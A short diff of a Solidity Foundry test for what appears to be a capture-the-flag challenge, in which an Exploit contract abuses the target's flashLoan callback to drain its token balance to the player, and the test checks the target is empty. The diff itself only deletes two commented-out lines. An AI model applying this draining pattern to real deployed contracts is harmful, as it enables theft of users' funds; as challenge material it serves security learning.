@@ -34,8 +34,6 @@ contract Challenge1Test is Test {
 
         target.flashLoan(address(exploit), abi.encodeWithSignature("pwn(address,address)", player, token1));
 
-        // token.transferFrom(address(target), player, token.balanceOf(address(target)));
-
         vm.stopPrank();
 
         assertEq(token.balanceOf(address(target)), 0, "contract must be empty");
@@ -76,6 +74,5 @@ contract Exploit {
     function pwn(address _user, address _token2) external {
         token.transfer(_user, token.balanceOf(address(this)));
         token = IERC20(_token2);
-        // token.approve(_user, token.balanceOf(address(this)));
     }
 }
